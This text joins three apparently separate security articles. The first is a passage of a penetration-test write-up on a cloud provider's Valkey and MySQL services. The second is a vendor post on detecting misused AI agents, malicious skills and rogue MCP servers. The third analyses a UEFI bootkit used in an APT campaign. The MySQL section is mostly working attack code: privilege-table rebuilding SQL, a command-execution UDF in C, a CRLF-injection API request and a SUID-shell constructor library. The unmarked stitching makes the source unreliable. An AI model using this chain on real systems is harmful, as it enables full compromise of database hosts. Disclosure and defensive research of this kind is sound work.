During analysis of the Valkey instances deployed in the cloud infrastructure, we found that the software version in use was vulnerable to CVE-2026-25243. At the time of the analysis, no public proofs of concept (PoCs) or exploits existed. To study how the vulnerability manifests, we analyzed the diagnostic data returned by the INFO command:

valkey_version=7.2.11 redis_version=7.2.4 redis_git_sha1=97b6663c redis_git_dirty=0 redis_build_id=a75ca2f023d97d88 gcc_version=13.3.0 arch_bits=64 os=Linux 6.8.0-124-generic x86_64 executable=/usr/bin/valkey-server

The redis_build_id identifier made it possible to determine the exact binary in use. It matched the official build for Ubuntu Noble x86_64.

CVE-2026-25243 is caused by the RESTORE command handling serialized RDB objects incorrectly. When the legacy hash-zipmap encoding is used, the validator accepts a 5-byte length representation for a short key, but the parser that follows interprets the key’s internal bytes as the encoding of the value length. This mismatch can cause an out-of-bounds write that overwrites adjacent heap chunks (heap overflow), which can potentially lead to an arbitrary write primitive. After the successful arbitrary write to adjacent memory regions, strict systemd sandbox rules presented an obstacle:

NoExecPaths=/ ExecPaths=/usr/bin/valkey-server /usr/lib /lib CapabilityBoundingSet= NoNewPrivileges=true PrivateUsers=true ProtectSystem=strict ProtectHome=true SystemCallFilter=@system-service SystemCallFilter=~ @privileged @resources

These parameters block the execution of standard shells, such as /bin/sh. Even so, the /tmp directory was mounted with write access. By modifying the process logic, we could trigger the download and execution of a third-party component from /tmp, which wasn’t covered by the noexec rule. After establishing a stable communication channel, we added an SSH key to /var/lib/valkey/.ssh/authorized_keys. This gave us independent access to the host and the ability to escalate privileges further through standard local privilege escalation (LPE) methods.

Valkey process context and Salt grains parameters

The GRO Frag vulnerability was triggered in this case, but new LPEs are disclosed every week, so there may be many other ways to escalate privileges and continue the attack on the Salt master.

4.2. MySQL

The MySQL database user didn’t have root privileges when the resource was created.

DROP TABLE IF EXISTS mysql.global_grants; CREATE TABLE mysql.global_grants ( USER char(32) NOT NULL DEFAULT '', HOST char(255) NOT NULL DEFAULT '', PRIV char(32) NOT NULL DEFAULT '', WITH_GRANT_OPTION enum('N','Y') NOT NULL DEFAULT 'N', PRIMARY KEY (USER, HOST, PRIV) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 STATS_PERSISTENT=0;

However, the application logic allowed this user to drop and recreate the table with dynamic privileges:

DROP TABLE IF EXISTS mysql.user; CREATE TABLE mysql.user ( Host char(255) NOT NULL DEFAULT '%', User char(32) NOT NULL DEFAULT '', Select_priv enum('N','Y') NOT NULL DEFAULT 'Y', Insert_priv enum('N','Y') NOT NULL DEFAULT 'Y', Update_priv enum('N','Y') NOT NULL DEFAULT 'Y', Delete_priv enum('N','Y') NOT NULL DEFAULT 'Y', Create_priv enum('N','Y') NOT NULL DEFAULT 'Y', Drop_priv enum('N','Y') NOT NULL DEFAULT 'Y', Reload_priv enum('N','Y') NOT NULL DEFAULT 'Y', Shutdown_priv enum('N','Y') NOT NULL DEFAULT 'Y', Process_priv enum('N','Y') NOT NULL DEFAULT 'Y', File_priv enum('N','Y') NOT NULL DEFAULT 'Y', Grant_priv enum('N','Y') NOT NULL DEFAULT 'Y', References_priv enum('N','Y') NOT NULL DEFAULT 'Y', Index_priv enum('N','Y') NOT NULL DEFAULT 'Y', Alter_priv enum('N','Y') NOT NULL DEFAULT 'Y', Show_db_priv enum('N','Y') NOT NULL DEFAULT 'Y', Super_priv enum('N','Y') NOT NULL DEFAULT 'Y', Create_tmp_table_priv enum('N','Y') NOT NULL DEFAULT 'Y', Lock_tables_priv enum('N','Y') NOT NULL DEFAULT 'Y', Execute_priv enum('N','Y') NOT NULL DEFAULT 'Y', Repl_slave_priv enum('N','Y') NOT NULL DEFAULT 'Y', Repl_client_priv enum('N','Y') NOT NULL DEFAULT 'Y', Create_view_priv enum('N','Y') NOT NULL DEFAULT 'Y', Show_view_priv enum('N','Y') NOT NULL DEFAULT 'Y', Create_routine_priv enum('N','Y') NOT NULL DEFAULT 'Y', Alter_routine_priv enum('N','Y') NOT NULL DEFAULT 'Y', Create_user_priv enum('N','Y') NOT NULL DEFAULT 'Y', Event_priv enum('N','Y') NOT NULL DEFAULT 'Y', Trigger_priv enum('N','Y') NOT NULL DEFAULT 'Y', Create_tablespace_priv enum('N','Y') NOT NULL DEFAULT 'Y', ssl_type enum('','ANY','X509','SPECIFIED') NOT NULL DEFAULT '', ssl_cipher blob NOT NULL, x509_issuer blob NOT NULL, x509_subject blob NOT NULL, max_questions int unsigned NOT NULL DEFAULT 0, max_updates int unsigned NOT NULL DEFAULT 0, max_connections int unsigned NOT NULL DEFAULT 0, max_user_connections int unsigned NOT NULL DEFAULT 0, plugin char(64) NOT NULL DEFAULT 'caching_sha2_password', authentication_string text, password_expired enum('N','Y') NOT NULL DEFAULT 'N', password_last_changed timestamp NULL DEFAULT NULL, password_lifetime smallint unsigned DEFAULT NULL, account_locked enum('N','Y') NOT NULL DEFAULT 'N', Create_role_priv enum('N','Y') NOT NULL DEFAULT 'Y', Drop_role_priv enum('N','Y') NOT NULL DEFAULT 'Y', Password_reuse_history smallint unsigned DEFAULT NULL, Password_reuse_time smallint unsigned DEFAULT NULL, Password_require_current enum('N','Y') DEFAULT NULL, User_attributes json DEFAULT NULL, PRIMARY KEY (Host, User) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 STATS_PERSISTENT=0;

After the database was restarted and a new user was created, that user automatically received full administrator privileges. Next, we added more privileges:

INSERT INTO mysql.global_grants VALUES ('newadm','%','SYSTEM_VARIABLES_ADMIN','Y'); INSERT INTO mysql.global_grants VALUES ('newadm','%','PERSIST_RO_VARIABLES_ADMIN','Y'); INSERT INTO mysql.global_grants VALUES ('newadm','%','SYSTEM_USER','Y'); FLUSH PRIVILEGES;

Having escalated privileges in the database, we now needed to achieve RCE. We compiled a custom UDF library to run system commands.

#include <stdlib.h> #include <string.h> #include <stdio.h> typedef unsigned long long udf_args_type; typedef struct { unsigned int arg_count; unsigned int *arg_type; char **args; unsigned long *lengths; char *maybe_null; char **attributes; unsigned long *attribute_lengths; void *extension; } UDF_ARGS; typedef struct { char maybe_null; unsigned int decimals; unsigned long max_length; char *ptr; char const_item; void *extension; } UDF_INIT; int sys_eval_init(UDF_INIT *initid, UDF_ARGS *args, char *message) { if (args->arg_count != 1) { strcpy(message, "sys_eval requires one argument"); return 1; } initid->max_length = 65535; return 0; } void sys_eval_deinit(UDF_INIT *initid) {} char* sys_eval(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error) { if (!args->args[0]) { *is_null = 1; return NULL; } char cmd[65535]; snprintf(cmd, sizeof(cmd), "%.*s", (int)args->lengths[0], args->args[0]); FILE *pipe = popen(cmd, "r"); if (!pipe) { *is_null = 1; return NULL; } static char buf[65535]; size_t total = 0; while (total < sizeof(buf)-1) { size_t n = fread(buf+total, 1, sizeof(buf)-1-total, pipe); if (n == 0) break; total += n; } pclose(pipe); buf[total] = '\0'; *length = total; return buf; }

RCE was achieved through a CRLF injection into the configuration file through the cloud provider’s API:

curl -s -X PATCH "https://somecloud/api/dbaas/id" \ -H "Content-Type: application/json" \ -H "Authorization: Bearer $TOKEN" \ -d '{"config_parameters":{"default-time-zone":"+00:00\nsecure_file_priv=\nplugin_dir=/var/lib/mysql-files/\ndefault-time-zone=+00:00\n#"}}'

This vector made it possible to inject line breaks and override critical configuration parameters:

default-time-zone="+00:00 secure_file_priv= # removes write restrictions so files can be saved to any directory the MySQL user can access. plugin_dir=/var/lib/mysql-files/ # sets a trusted directory for loading dynamic libraries.

With the write permissions obtained, a malicious UDF library (shared object) was written to the target directory through the following SQL statement:

SELECT UNHEX('$hex') INTO DUMPFILE '/var/lib/mysql-files/rce.so

We restarted the MySQL database to apply the updated configuration and initialize the registered plug-in:

CREATE FUNCTION sys_eval RETURNS STRING SONAME 'rce.so';

Result of executing id via MySQL UDF

The list of active services was analyzed to identify opportunities for local privilege escalation to root. It turned out that the mysql-watcher.service ran with administrator privileges and periodically launched a Python script that accessed MySQL through the system client. To exploit this, we compiled another plug-in:

#include <stdlib.h> __attribute__((constructor)) static void init(void) { system("cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash"); }

We injected the path to the directory containing the malicious library (.so file, plugin_dir parameter) and the authentication plug-in name default-auth=plugname into the [client] section of the /etc/mysql/my.cnf configuration file. The next time the background mysql-watcher.service starts the MySQL client as root, the plug-in described above executes on the server host. This causes a system command to run and creates a copy of the Bash interpreter with the SUID bit set (/tmp/rbash), which completes the chain leading to full host compromise.

Conclusion

The cloud provider’s infrastructure was built on in-house components rather than standard open-source solutions, which created a non-trivial attack surface. The research also identified other vulnerabilities, but they were left out of the report because they were standard. Based on the findings, the vendor was given recommendations for strengthening its security posture. The recommendations covered isolating managed services to remove network visibility between them, enforcing strict AppArmor policies to isolate service processes, and adding monitoring of how potentially vulnerable services are used.

articles.title: Deploying AI agents securely: how Kaspersky products mitigate AI threats
articles.context: To this end, we added profiles to the Kaspersky Threat Intelligence Portal that describe various AI agents and how attackers exploit them
articles.full_text:
Introduction

AI agents and associated tooling are becoming increasingly common in corporate infrastructure. Agents can perform a range of actions with the user’s privileges, such as accessing data, running commands, and interacting with external services. This creates new security risks, especially when these tools are used without the security team’s oversight or well-designed policies.

Detecting, tracking, and controlling AI agents is becoming one of the most pressing tasks for security teams today. We closely follow technological developments and continuously update our solutions to respond to new threats in a timely manner amid a rapidly changing technology landscape. This post describes new expertise built into Kaspersky products that helps counter the threats posed by the proliferation of AI agents. We approach this problem from several angles.

First, you need to thoroughly understand the threat you are dealing with. To this end, we added profiles to the Kaspersky Threat Intelligence Portal that describe various AI agents and how attackers exploit them. At their core, AI agents are programs (processes) that run in the operating system on endpoints and can also launch other processes. This means that Endpoint Detection and Response solutions are among the key endpoint controls for this threat. These solutions detect the presence and launch of AI agents, track their activity, and identify potentially dangerous behavior. When needed, they also take action, such as stopping a suspicious process, blocking the activity, or isolating the host, to reduce the likelihood of an incident escalating. For this purpose, we developed specially adapted detection rules.

You can use Kaspersky Endpoint Security, now also available as Kaspersky Next, to control and restrict the launch of AI agents. This solution uses two components to detect AI agents and control how they are used. Application Control categorizes the application processes launched on endpoints, and Web Control manages access to specific categories of web resources for users on endpoints.

Finally, even harmless AI agents can contain malicious instructions (skills), such as those downloaded from unsafe external sources. Kaspersky Scan Engine analyzes installed applications to detect these threats and also checks LLM files for malicious code. Let’s take a closer look at these solutions and technologies.

Popular AI applications and services in organizations

Tools from Anthropic and OpenAI take the top spots in the September 2026 ranking of AI agents by popularity among Kaspersky users. This list is based on telemetry from Kaspersky solutions. It shows the number of users who had the relevant AI vendors’ products installed at the time of the study.

While analyzing the most popular and widely used apps, our experts also noticed a sharp rise in vulnerable versions of AI-related software and services. From 2025 to date, more than 2500 vulnerabilities have been published:

Number of published vulnerabilities in LLMs, AI tools, and plugins with similar functionality, 2025–2026 (download)

* Data for previous quarters was updated and may differ slightly from previously published data.

Application Control and Web Control

To enforce the organization’s security policy for AI agents and other AI applications on the corporate network, Kaspersky products offer application control based on KL categories. These categories classify installed software and give you granular control over which approved applications can run in the organization.

Application Control analyzes the processes launched on endpoints, tracking which AI agents are running in corporate systems at any given moment, on which hosts, and under which accounts. Application Control also shows how long a given program has been in use.

This makes it easier for the Kaspersky Security Center (KSC) administrator to control applications. Administrators can use KL categories to allow or block AI agents inside the company for specific groups of employees.

Here is what this functionality looks like to KSC administrators:

KL categories available when configuring Application Control

For details on how to configure Application Control in KSC, follow this link.

In Kaspersky Endpoint Security (KES), Application Control can operate in two modes:

Denylist. In this mode, Application Control lets users run any applications except those blocked by Application Control rules. This is the default mode.

Allowlist. In this mode, Application Control blocks users from running any applications except those explicitly allowed by Application Control rules.

Below are the steps to configure Application Control to block AI tools.

Configuring Application Control for the AI Tools category in KES

With this setup, when a user tries to launch an AI agent, they get a notification and the agent doesn’t start.

KES notification about an attempt to launch an AI agent

For more on how to configure Application Control in KES, follow this link. Our public portal also lets you explore information on KL categories and the applications that fall under them, in particular details on how AI agents are categorized and how popular they are.

AI Tools KL category

The View applications drop-down list shows products for a specific vendor.

Similarly, Web Control lets you manage user access to web resources. If a user tries to open a denylisted website, KES blocks access and shows a warning.

KES notification about an attempt to access a prohibited web resource

When configuring access, the administrator can block websites that provide AI as a service.

Website categories

For more on configuring Web Control, follow this link. The help portal also provides information on website categories that can be assigned to resources to configure access control.

Kaspersky Endpoint Detection and Response

To an EDR solution, an AI agent is a regular process. It has its own executable, a tree of child processes, and network communications, all of which need to be monitored for suspicious activity. An attacker can use an AI agent as an automation tool. An AI agent installed as a legitimate user tool can also be leveraged in a ClickFix attack, where it executes a malicious instruction received from an untrusted source, such as a document, web page, or email. That said, unsafe actions by an agent do not always indicate an attack. There may be no malicious intent in the chain at all. An incident can result from what looks like an ordinary instruction from a user who doesn’t fully understand the consequences of having it executed. The mere fact that an agent was launched does not reveal whether it is being used in an attack. That is why Kaspersky EDR (KEDR) uses both conventional behavioral rules and rules written and adapted to detect AI tools. The latter identify risky agent actions and settings, and help determine which AI tool was involved in suspicious activity.

Conventional KEDR rules detect the vast majority of familiar malicious techniques, including when performed by an AI agent. A suspicious PowerShell launch, persistence via Task Scheduler, or an attempt to steal credentials leaves clear, identifiable traces. These traces look the same no matter what initiated the actions. The rules analyze launch parameters, process relationships, affected files, network activity, and other telemetry events.

For example, in a recent Armored Likho campaign, we found signs that AI had been used to create loader and dropper samples, which were later compiled with NSIS (Nullsoft Scriptable Install System). The key telltale artifacts were icons in the scripts and excessive comments on every function, which is uncharacteristic of human-written code. In addition, the group continues to generate new modules for its BusySnake Stealer and BusySnake RAT samples. For example, the attackers used AI to develop a module that runs multiple checks for virtual environment artifacts and calculates a score. Depending on the score, the sample either runs or exits with code 0. Even though the initial access samples, payloads, and their modules were AI-generated, the commands they execute via rundll32 and PowerShell are detected by the shell_creation_by_rundll32 and suspicious_powershell_cmd_or_script_spawning rules.

So, for detecting an attack like this, it is not important who wrote the loader, the payload, or its modules: they are given away by the commands they execute, process relationships, and other traces of activity in the system. AI can be involved both in preparing the code and in carrying out the attack directly on the device.

In the latter case, the attacker uses the agent to carry out their tasks and lets it choose and run the required commands within the privileges it has. For effective protection, it is critical to link suspicious actions back to the AI tool and the conditions under which it operates. In KEDR, several specialized rules handle this task.

We have created separate rules for popular AI agents, ai_agent_*_access_to_sensitive_file_**, where * is the tool name and ** is the operating system. They generate alerts when an agent accesses files that contain credentials, tokens, or keys.

ai_agent_opencode_access_to_sensitive_file_win Tap to previewTap to hide

The ai_agent_dangerous_execution_mode rule detects agents launched with auto-approval of all actions (so-called YOLO mode) or with the sandbox disabled. These settings do not indicate an attack on their own, but they let the agent perform dangerous actions without user confirmation.

ai_agent_dangerous_execution_mode Tap to previewTap to hide

The suspicious_mcp_server_artifact rule triggers when MCP server scripts are created or modified in hidden, temporary, or cache directories. Attackers can place an MCP server in these locations to quietly connect it to the agent: through the MCP server, they can pass instructions to the agent, call third-party tools, and access the user’s data.

The llm_api_access_by_unusual_apps rule generates an alert when an application on Windows, Linux, or macOS connects to the API of a known external LLM service, unless this activity falls under predefined exclusions. This helps spot model access by applications that do not normally behave this way.

llm_api_access_by_unusual_apps Tap to previewTap to hide

Some Kaspersky EDR rules tag events for investigation but do not generate alerts. For example, the ai_agent_**_execution rules flag launches of known agents on Windows, Linux, and macOS. The local_ai_model_artifact rule records the creation or modification of AI model files in typical application, runtime, and cache directories. These events reveal AI tools on the device, including tools that run on local models and never call an external API.

Kaspersky Threat Intelligence Portal

AI agent profiles

The Kaspersky Threat Intelligence Portal offers a large number of software profiles, including profiles of AI agents. You can sort them by the ai_ prefix:

AI agent profiles on Kaspersky TIP

The profile of an AI agent such as Claude Desktop includes a detailed description of the software, the privilege level required to run it, supported platforms, and threat actor groups known to use it. It also lists tactics and techniques mapped to the MITRE ATT&CK framework, with descriptions of the procedures the tool can be used for.

Claude profile on Kaspersky TIP

The description also lists ways to detect the software through standard system auditing mechanisms:

Windows: events from standard audit logs and Sysmon events

Linux: syscall audit events and Sysmon events

Network auditing: a set of protocols and the traffic generated by the software

The detection section lists the main artifacts the software leaves in the system: command lines, possible launch parameters, names of the services and scheduled tasks it creates, and the key network artifacts.

Detection section in the Claude profile

Hunt Hub

In December 2025, the Kaspersky Threat Intelligence Portal added Hunt Hub (HH), a repository of detection rules. This is a unique Kaspersky project, and we developed it in response to growing market demand.

This functionality is available in the Threat Landscape section of the portal. It gives analysts access to detection rules: their descriptions and their mapping to MITRE ATT&CK tactics and techniques, as well as to the associated cybercriminal groups.

In the Hunt Hub section, customers can explore the detection logic of EDR, NDR, and NGFW products, including the logic for detecting AI agents.

Rules in the Hunt Hub repository

The rule card provides:

Detailed description

Rule’s severity level, confidence level, and alert format

Detection tips

Description of possible false positives

Platforms the rule can run on

Tactics, techniques, and sub-techniques covered by the rule

Groups that use the technique covered by the rule

Detection logic that shows what exactly triggers the rule

Detection rule card in Hunt Hub

Kaspersky Scan Engine

Skills are a key component of the AI agent ecosystem. They’re prewritten sets of natural-language instructions that extend agent functionality. We previously covered the risks that malicious skills pose to agent users. A skill can require the usage of additional programs and services, come with helper scripts (for example, written in Python), or contain a malicious command embedded right in the instruction text. This means that adding skills to an originally harmless AI agent opens up several new ways for malicious code to enter the system. To prevent this, any skills obtained from external sources must be scanned. Kaspersky Scan Engine is well suited for this task. This is a cyberthreat detection and response solution that seamlessly integrates with various applications. It can detect malicious code in agent skills, associated scripts, and in files generated by running agents.

Detection of a malicious agent skill in Kaspersky Scan Engine

Trained LLMs come in many formats. Some of them (PTH, PT, PKL, KERS, and others) also store parameters and weights (training datasets). These files can also contain malicious code, so it’s critical to scan them before running and using them. Kaspersky Scan Engine scans potentially dangerous LLM formats for infected data. It can deserialize and analyze models to detect malicious code regardless of model size.

Detection of an LLM with malicious code in Kaspersky Scan Engine

Conclusion

AI agents are rapidly making their way into corporate environments: they help employees work faster and take on a wide range of tasks, but they also open up new opportunities for attackers. To take advantage of this technology without compromising security, organizations need to build multi-layered protection and minimize risks. A range of Kaspersky solutions can help with this:

Kaspersky TIP keeps you up to date on current scenarios in which attackers use AI agents, and its Hunt Hub section provides rules for detecting suspicious AI agent activity.

Kaspersky EDR detects AI agents in the infrastructure and monitors their activity on endpoints. If it detects potentially dangerous actions, the product can log the event, notify the SOC, and take response actions, such as stopping the process or isolating the host.

Application Control in Kaspersky products can fully restrict the use of AI agents within the company by using application categorization. The Web Control component can restrict access to AIaaS web resources.

Kaspersky Scan Engine can be integrated into various company processes to detect malicious code in any files, including AI agent skills and LLMs.

When companies combine the tools described above in a comprehensive approach, they can adopt AI agents in an informed way: with an understanding of the associated risks and effective means of minimizing them.

Introduction

Back in October 2022, Kaspersky GReAT was looking into a peculiar advertisement on a hacking forum. A cybercriminal had been advertising a UEFI bootkit, dubbed BlackLotus, that could bypass Secure Boot, for $5,000. Given the low price for such powerful capabilities, the cybersecurity community initially took this advertisement with a grain of salt. As no BlackLotus samples were found in the wild, no one could at the time verify the claims made in the forum post.

BlackLotus advertisement

However, about half a year later, in March 2023, ESET confirmed that the BlackLotus advertisement was genuine. The researchers tracked down samples of this bootkit and confirmed that it can indeed bypass Secure Boot through a vulnerability called Baton Drop (CVE-2022-21894). As this vulnerability was still exploitable in 2023, Microsoft had to release multiple security updates to address it.

Since the release of these updates, the BlackLotus bootkit has gone quiet — no publicly known attacks have used it. Yet in early 2026, we discovered a malware sample similar to BlackLotus that was used in an APT campaign in Central Asia. In this report, we share our findings, including new payloads and possible attribution of this campaign.

The return of the infamous bootkit

In early 2026 we identified a complex APT attack targeting diplomatic agencies in Central Asian countries — namely Tajikistan, Uzbekistan, and Turkmenistan. This attack involved a UEFI bootkit that we dubbed BlackX. Having examined it, we found it to be similar to BlackLotus.

Attackers have been deploying BlackX after compromising the victim machine networks and obtaining administrator privileges. To install the bootkit, we observed them dropping the following files:

inst.exe, an installer executable

PVMDIJGKAX2, an RC4-encrypted extensionless file containing files and strings required for the installation

The installer was launched with the command line C:\ProgramData\Intel\inst.exe PVMDIJGKAX2 Q46F6MDLI3RX2KV1. The last argument here is the RC4 key used for decryption.

Curiously, the file inst.exe does not contain any malicious strings or embedded blobs. All the files needed to install the malicious payload are inside PVMDIJGKAX2, which makes it harder for incident responders to retrieve the bootkit components.

The installer package drops a set of files to both system and UEFI partitions, designed to exploit the Baton Drop vulnerability. We noted that the implementation of the exploit is remarkably similar to the one used in the BlackLotus malware. As with BlackLotus, the goal of the exploit is to install custom Machine Owner Keys (MOK), which allows loading arbitrary EFI files on the target machines to manipulate Secure Boot.

While the vulnerability exploitation chain was implemented very similarly to BlackLotus, we spotted differences between the exploits in BlackLotus and BlackX. That said, the source code of the BlackLotus bootkit has never been published online. This could mean that the attackers behind BlackX either reverse-engineered the BlackLotus bootkit or purchased its source code from cybercriminals. Either way, this is an interesting observation, as we rarely see APT actors borrow ideas or code from cybercrime actors.

Payload launched by the bootkit

The UEFI payload delivered during the Baton Drop exploitation has a classic bootkit goal — to inject a malicious driver into the Windows kernel. This driver differs from the one deployed by BlackLotus and is signed with a certificate belonging to an organization named 温江区明宇网络技术服务工作室 (English: Wenjiang District Mingyu Network Technology Service Studio). At the time of writing, this certificate (serial number: 0bcdf5e0da32d68900b8b7638459d072) has been revoked by its issuer.

The driver aims to tamper with security solutions installed on the machine. For example, it disables process, thread, and registry callbacks related to security solutions. It also tampers with ETW providers so that security solutions cannot access their output. Curiously, some of the tampering procedures are designed to run only if Kaspersky or Avast solutions are installed on the infected machine. However, during dynamic analysis of this driver, we found that these procedures are useless — they fail to interfere with Kaspersky products in any way.

The driver also protects the bootkit’s files from tampering. It intercepts kernel requests to open these files and returns a handle to calc.exe instead of a malicious file handle.

User-mode second-stage payloads

Apart from tampering with security solutions, the driver also deploys a user-mode payload. We observed two such payloads, used for cyberespionage, in the wild. One of them is a RAT that can load further-stage .NET payloads. This RAT uses cloud storage for C2 server communications — we observed its versions using Google Drive, OneDrive, and Yandex.Disk. Having connected to a cloud storage service, this RAT iterates over files available there and interprets them depending on the file suffix. Below is a list of supported suffixes:

File suffix

Description

Type

0X01

A .NET file. The task is to parse it and run the method TEST.Class1.RunCMD(argument_array) from the module

Input

0X02

Result of the call TEST.Class1.RunCMD(argument_array)

Output

0X03

Task to upload a file to the drive

Input

0X04

Uploaded file

Output

0X05

Task to download a file to an infected machine

Input

0X06

File download status

Output

SSSR

Contains initial system info

Output

We also observed another payload delivered through the bootkit, which we dubbed OxiDLLRunner. It is a malicious DLL obfuscated with OLLVM. It is loaded by the legitimate file googleupdate.exe (original filename: jcef_helper.exe, MD5: AF8A983B9ADA07EAE1259BF2953ABD40), which is also delivered by the bootkit. The DLL decrypts the contents of the file v8_context_snapshot.bin, which resides in the same folder, and then jumps to the beginning of the decrypted content. The decrypted data starts with shellcode followed by a PE file, which is a Rust payload designed to communicate with the www[.]archivetj[.]com C2 server. During communication, this payload is supposed to receive DLL files exporting a function named create_plugin, which are then executed in separate threads.

Attribution

Based on the following facts, we have attributed this attack to the APT41 threat actor with medium confidence:

In June 2026, ESET published a blog post on attacks by the FishMonger threat actor, which the community assumes to be related to APT41. This post describes a kernel implant with a PDB path starting with C:\Users\xdd\Desktop. While describing the campaign, the post also suggests the possible use of an unspecified UEFI bootkit component, which might exploit CVE‑2023‑24932. We observed the identifier “xdd” used multiple times in the BlackX bootkit payloads, so we assess that BlackX is the UEFI bootkit referenced in the ESET blog post;

The payloads deployed by BlackX are loaded using a legitimate executable abused via DLL sideloading, and an encrypted file — this pattern is common among Chinese-speaking threat actors;

The OxiDLLRunner file has been obfuscated with OLLVM, an obfuscator commonly used by Chinese-speaking actors.

Why did the target organizations get infected?

During our initial analysis of BlackX, we thought that attackers succeeded in deploying it due to the negligence of the target organizations. Baton Drop, the vulnerability used to deploy BlackX, was disclosed back in 2023 and was patched, so we first thought that the infected machines lacked the relevant updates. However, our investigation proved this wrong — the targeted machines were fully patched.

Instead, we found out that the problem was with the patch itself. As it turned out, the patch for the Baton Drop vulnerability is designed to revoke the “Windows Production PCA 2011” certificate used to sign vulnerable UEFI components. However, this revocation does not happen automatically upon patch installation — the user has to trigger it manually. This is done with the following steps:

A registry flag is set inside HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Secureboot;

A scheduled task named Secure-Boot-Update is created.

This patch is designed to be applied manually — for instance, applying it automatically could break dual-boot systems relying on the “Windows Production PCA 2011” certificate to load. At the same time, this patch deployment practice creates a problem — as it is extremely unusual for a system administrator to take extra steps after installing an update. Usually, when applying patches, system administrators take no further action unless an installation failure occurs. These instructions for activating the patch are buried deep on the Microsoft website, and we assess that they are quite hard for an average IT administrator to notice.

Curiously, Microsoft’s plan for deploying the Baton Drop patches mentions an “Enforcement Phase” that involves revoking the “Windows Production PCA 2011” certificate automatically, without user interaction. At the time of publishing this post, this stage has not been implemented. On October 19, 2026, this certificate expired, but this does not prevent the vulnerable binaries from loading unless the certificate is blocklisted.

It is likely that the threat actor behind this campaign took into account that few organizations realized the importance of manually activating the Baton Drop patch. As such, we believe they decided to invest time in understanding how BlackLotus works and creating a copycat of this bootkit.

Conclusion

Patch management is important for every organization, as updates from vendors help protect software and hardware against known vulnerabilities. However, sometimes installed patches fail to protect against the flaws they address. The BlackLotus story we described is not the only such example — for instance, in 2025 Microsoft released an update against the ToolShell vulnerability that also had to be applied manually.

However, modern security solutions are designed to account for such cases when installed patches fail to protect against security flaws for one reason or another. For instance, the Exploit Prevention component available in Kaspersky products prevents exploits from running if the patch is not applied, or if it is a zero-day vulnerability with no available patch. It is thus crucial to equip all machines in an organization with security solutions and constantly monitor the alerts they raise.
